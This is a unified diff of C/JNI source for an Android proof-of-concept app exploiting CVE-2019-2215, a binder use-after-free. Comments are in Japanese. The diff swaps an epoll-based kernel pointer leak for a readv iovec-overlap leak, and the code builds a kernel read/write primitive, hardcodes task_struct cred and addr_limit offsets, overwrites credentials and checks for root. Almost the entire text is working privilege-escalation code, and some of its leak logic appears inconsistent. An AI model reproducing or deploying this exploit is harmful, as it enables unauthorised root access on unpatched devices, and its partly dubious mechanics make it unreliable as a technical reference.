@@ -36,22 +36,19 @@
 #endif
 
 #define PAGE_SIZE 4096
+#define IOVEC_COUNT 25
+#define OVERLAP_INDEX 10
 #define TASK_STRUCT_SIZE 4096
-
-// カーネル 4.4 (ARM64) のオフセット（概ね固定）
-#define BINDER_THREAD_PROC_OFFSET 0x18   // binder_thread->proc
-#define BINDER_PROC_TSK_OFFSET    0x20   // binder_proc->tsk
-#define TASK_CRED_OFFSET          0x688  // task_struct->cred
-#define TASK_ADDR_LIMIT_OFFSET    0xA18  // task_struct->addr_limit
 
 static int binder_fd;
 static int epoll_fd;
 static int krw_pipe[2];
 static uint64_t task_struct_kptr = 0;
 static uint64_t cred_kptr = 0;
-static int cred_offset = TASK_CRED_OFFSET;
-static int addr_limit_offset = TASK_ADDR_LIMIT_OFFSET;
+static int cred_offset = 0x688;
+static int addr_limit_offset = 0xA18;
 
+// CPU バインディング（安定性向上）
 void bind_cpu(void) {
     cpu_set_t cpu_set;
     CPU_ZERO(&cpu_set);
@@ -71,12 +68,17 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
-// ========== Step 1: epoll_wait で binder_thread アドレスをリーク ==========
-int leak_binder_thread(void) {
+// ========== Step 1: readv で task_struct をリーク ==========
+int leak_task_struct(void) {
+    int pipefd[2];
     pid_t cpid;
-    struct epoll_event ev, events[1];
+    struct iovec iovec_stack[IOVEC_COUNT];
+    void *aligned_address;
+    struct pollfd pfd;
+    ssize_t n;
+    uint64_t *data;
 
-    LOGI("[*] Leaking binder_thread via epoll_wait...");
+    LOGI("[*] Leaking task_struct via readv (standard method)");
 
     binder_fd = open("/dev/binder", O_RDWR);
     if (binder_fd < 0) {
@@ -91,11 +93,7 @@ int leak_binder_thread(void) {
         close(binder_fd);
         return -1;
     }
-    LOGI("[+] epoll_fd=%d", epoll_fd);
-
-    memset(&ev, 0, sizeof(ev));
-    ev.events = EPOLLIN | EPOLLWAKEUP;
-    ev.data.u64 = 0x123456789ABCDEF0ULL;  // ダミー値（イベント発生時に書き換えられる）
+    struct epoll_event ev = {.events = EPOLLIN};
     if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
         LOGE("epoll_ctl ADD failed: %s", strerror(errno));
         close(binder_fd);
@@ -104,88 +102,122 @@ int leak_binder_thread(void) {
     }
     LOGI("[+] epoll_ctl ADD succeeded");
 
+    if (pipe(pipefd) < 0) {
+        LOGE("pipe failed: %s", strerror(errno));
+        close(binder_fd);
+        close(epoll_fd);
+        return -1;
+    }
+    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        LOGE("fcntl F_SETPIPE_SZ failed: %s", strerror(errno));
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+    LOGI("[+] pipefd: read=%d, write=%d", pipefd[0], pipefd[1]);
+
+    aligned_address = mmap_page(0x100000000UL);
+    if (!aligned_address) {
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+    LOGI("[+] aligned_address=%p", aligned_address);
+
+    // オーバーラップ iovec 設定
+    memset(iovec_stack, 0, sizeof(iovec_stack));
+    iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
+    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
+    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
+    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
+    LOGI("[+] iovec overlap configured");
+
     cpid = fork();
     if (cpid < 0) {
         LOGE("fork failed: %s", strerror(errno));
         close(binder_fd);
         close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
         return -1;
     }
 
     if (cpid == 0) {
-        usleep(50000);
+        // 子プロセス: 少し待ってから BINDER_THREAD_EXIT
+        usleep(100000);  // 100ms
         LOGI("[child] BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
         LOGI("[child] BINDER_THREAD_EXIT done");
         _exit(0);
     }
 
-    LOGI("[parent] Waiting for epoll_wait...");
-    int n = epoll_wait(epoll_fd, events, 1, 5000);
+    // 親: pipe にデータが来るのを待つ（タイムアウト 5 秒）
+    pfd.fd = pipefd[0];
+    pfd.events = POLLIN;
+    int poll_ret = poll(&pfd, 1, 5000);
+    if (poll_ret < 0) {
+        LOGE("poll failed: %s", strerror(errno));
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+    if (poll_ret == 0) {
+        LOGE("poll timeout");
+        close(binder_fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    // readv で pipe から読み取り
+    n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
+    LOGI("[parent] readv returned %zd bytes", n);
     if (n < 0) {
-        LOGE("epoll_wait failed: %s", strerror(errno));
+        LOGE("readv failed: %s", strerror(errno));
         close(binder_fd);
         close(epoll_fd);
-        return -1;
-    }
-    if (n == 0) {
-        LOGE("epoll_wait timeout");
-        close(binder_fd);
-        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
         return -1;
     }
 
-    uint64_t leaked_ptr = events[0].data.u64;
-    LOGI("[+] epoll event data: 0x%llx", (unsigned long long)leaked_ptr);
-
-    // ダミー値から変化していなければ失敗
-    if (leaked_ptr == 0x123456789ABCDEF0ULL) {
-        LOGE("No binder_thread address leaked (event data unchanged)");
-        close(binder_fd);
-        close(epoll_fd);
-        return -1;
+    // リークした task_struct を探す
+    data = (uint64_t *)aligned_address;
+    for (int i = 0; i < (n / 8); i++) {
+        uint64_t val = data[i];
+        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+            task_struct_kptr = val & 0xFFFFFFFFFF000000LL;
+            if (task_struct_kptr != 0) {
+                LOGI("[+] Leaked task_struct @ 0x%llx (offset %d)", (unsigned long long)task_struct_kptr, i);
+                break;
+            }
+        }
     }
-
-    // カーネルアドレスっぽいことを確認
-    if ((leaked_ptr & 0xFFFFFFFFFF000000LL) != 0xFFFF000000000000LL) {
-        LOGE("Invalid kernel pointer: 0x%llx", (unsigned long long)leaked_ptr);
-        close(binder_fd);
-        close(epoll_fd);
-        return -1;
-    }
-
-    // binder_thread アドレスを保存
-    uint64_t binder_thread_addr = leaked_ptr;
-    LOGI("[+] binder_thread @ 0x%llx", (unsigned long long)binder_thread_addr);
-
-    // ===== ここから task_struct を計算 =====
-    // 1. binder_thread->proc を読み取る
-    uint64_t proc_addr = binder_thread_addr + BINDER_THREAD_PROC_OFFSET;
-    LOGI("[*] Reading binder_proc @ 0x%llx", (unsigned long long)proc_addr);
-
-    // proc_addr の値を直接読むには kernel RW が必要だが、ここではまだ持っていない。
-    // 代わりに、binder_thread の直後に binder_proc があると仮定してアドレスを計算する。
-    // 実際の構造体レイアウトでは、binder_proc は別の場所にあるため、この方法は不正確。
-    // そこで、binder_thread のアドレスから 0x100 程度オフセットをスキャンして task_struct を探す方法に切り替える。
-
-    // 簡易版：binder_thread から 0x20 バイト先を proc と仮定し、そのポインタを読む（間接参照はできないが、後で RW を使う）
-    // ここでは一旦、リークした binder_thread アドレスから 0x20 を引いた値を task_struct の候補とする（実際は間違い）。
-    // 正確には、binder_thread->proc を読み取るために kernel RW が必要なので、先に RW を構築する。
-
-    // 代わりに、binder_thread アドレスをそのまま task_struct として扱い、後でスキャンする。
-    task_struct_kptr = binder_thread_addr;
-    LOGI("[+] Using binder_thread as base for task_struct: 0x%llx", (unsigned long long)task_struct_kptr);
 
     wait(NULL);
     close(binder_fd);
     close(epoll_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    if (task_struct_kptr == 0) {
+        LOGE("Failed to leak task_struct");
+        return -1;
+    }
 
     return 0;
 }
 
 // ========== Step 2: カーネル読み書きプリミティブ ==========
 int setup_kernel_rw(void) {
-    LOGI("[*] Setting up kernel RW via pipe...");
+    LOGI("[*] Setting up kernel RW...");
 
     if (pipe(krw_pipe) < 0) {
         LOGE("krw pipe failed: %s", strerror(errno));
@@ -247,13 +279,13 @@ int setup_kernel_rw(void) {
     close(binder_fd);
     close(epoll_fd);
 
-    LOGI("[+] Kernel RW primitive ready");
+    LOGI("[+] Kernel RW ready");
     return 0;
 }
 
-// ========== Step 3: task_struct の正しいアドレスを特定（スキャン） ==========
-int find_task_struct(void) {
-    LOGI("[*] Scanning for actual task_struct...");
+// ========== Step 3: task_struct のスキャン（オフセット調整） ==========
+int scan_task_struct(void) {
+    LOGI("[*] Scanning task_struct for cred and addr_limit...");
 
     uint8_t *buf = malloc(TASK_STRUCT_SIZE);
     if (!buf) {
@@ -261,43 +293,62 @@ int find_task_struct(void) {
         return -1;
     }
 
-    // binder_thread アドレスから -0x1000 〜 +0x1000 の範囲をスキャン
-    for (int off = -0x1000; off <= 0x1000; off += 8) {
-        uint64_t addr = task_struct_kptr + off;
-        if (write(krw_pipe[1], &addr, 8) != 8) continue;
-        ssize_t n = read(krw_pipe[0], buf, TASK_STRUCT_SIZE);
-        if (n < 0) continue;
+    int found_cred = -1, found_al = -1;
+    uint64_t cred_val = 0, al_val = 0;
 
-        // cred ポインタと addr_limit を探す
-        int found_cred = -1, found_al = -1;
-        for (int i = 0; i <= n - 8; i += 8) {
-            uint64_t val = *(uint64_t *)(buf + i);
-            if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                if (found_cred == -1) {
-                    found_cred = i;
-                    cred_kptr = val;
-                }
-            }
-            if (val == 0x0000007FFFFFFFULL || val == 0xFFFFFFFFFFFFFFFEULL) {
-                found_al = i;
+    // リークしたアドレスをそのまま使う（オフセットは固定）
+    if (write(krw_pipe[1], &task_struct_kptr, 8) != 8) {
+        LOGE("write failed");
+        free(buf);
+        return -1;
+    }
+    ssize_t n = read(krw_pipe[0], buf, TASK_STRUCT_SIZE);
+    if (n < 0) {
+        LOGE("read failed");
+        free(buf);
+        return -1;
+    }
+
+    // cred ポインタを探す
+    for (int i = 0; i <= n - 8; i += 8) {
+        uint64_t val = *(uint64_t *)(buf + i);
+        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+            if (found_cred == -1) {
+                found_cred = i;
+                cred_val = val;
+                LOGI("[+] cred candidate at 0x%x: 0x%llx", i, (unsigned long long)val);
             }
         }
-
-        if (found_cred != -1 && found_al != -1) {
-            task_struct_kptr = addr;
-            LOGI("[+] Found task_struct @ 0x%llx", (unsigned long long)task_struct_kptr);
-            LOGI("[+] cred offset: 0x%x, addr_limit offset: 0x%x", found_cred, found_al);
-            cred_offset = found_cred;
-            addr_limit_offset = found_al;
-            free(buf);
-            return 0;
+        if (val == 0x0000007FFFFFFFULL || val == 0xFFFFFFFFFFFFFFFEULL) {
+            found_al = i;
+            al_val = val;
+            LOGI("[+] addr_limit candidate at 0x%x: 0x%llx", i, (unsigned long long)val);
         }
     }
 
-    // フォールバック
-    LOGI("[!] Using fallback offsets (cred=0x688, addr_limit=0xA18)");
-    cred_offset = TASK_CRED_OFFSET;
-    addr_limit_offset = TASK_ADDR_LIMIT_OFFSET;
+    if (found_cred != -1 && found_al != -1) {
+        cred_offset = found_cred;
+        addr_limit_offset = found_al;
+        cred_kptr = cred_val;
+        LOGI("[+] Found offsets: cred=0x%x, addr_limit=0x%x", cred_offset, addr_limit_offset);
+        free(buf);
+        return 0;
+    }
+
+    // フォールバック（既知のオフセット）
+    LOGI("[!] Using fallback offsets: cred=0x688, addr_limit=0xA18");
+    cred_offset = 0x688;
+    addr_limit_offset = 0xA18;
+    // cred ポインタを読み取る
+    uint64_t ptr = task_struct_kptr + cred_offset;
+    if (write(krw_pipe[1], &ptr, 8) != 8) {
+        free(buf);
+        return -1;
+    }
+    if (read(krw_pipe[0], &cred_kptr, 8) != 8) {
+        free(buf);
+        return -1;
+    }
     free(buf);
     return 0;
 }
@@ -349,16 +400,14 @@ int patch_cred(void) {
     return 0;
 }
 
-// ========== Step 6: root 確認（seccomp 回避） ==========
+// ========== Step 6: root 確認 ==========
 int verify_root(void) {
-    LOGI("[*] Verifying root via file write...");
-
-    // cred が書き換わっているので、getuid() は 0 を返すはず（seccomp は関係ない）
+    LOGI("[*] Verifying root...");
     uid_t uid = getuid();
     LOGI("[+] getuid() returns %d", uid);
 
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "echo 'uid=%d (root)' > /data/local/tmp/root.log", uid);
+    snprintf(cmd, sizeof(cmd), "echo 'uid=%d' > /data/local/tmp/root.log", uid);
     system(cmd);
 
     if (uid == 0) {
@@ -375,13 +424,13 @@ int verify_root(void) {
 JNIEXPORT jint JNICALL
 Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215Epoll(JNIEnv* env, jclass clazz) {
     LOGI("========================================");
-    LOGI("== CVE-2019-2215 epoll Final Exploit ==");
+    LOGI("== CVE-2019-2215 Final readv Exploit ==");
     LOGI("========================================");
 
     bind_cpu();
 
-    if (leak_binder_thread() < 0) {
-        LOGE("Failed at leak_binder_thread");
+    if (leak_task_struct() < 0) {
+        LOGE("Failed at leak_task_struct");
         return -1;
     }
 
@@ -390,8 +439,8 @@ Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215Epoll(JNIEnv* env, j
         return -1;
     }
 
-    if (find_task_struct() < 0) {
-        LOGE("Failed to find task_struct");
+    if (scan_task_struct() < 0) {
+        LOGE("Failed to scan task_struct");
         return -2;
     }
 
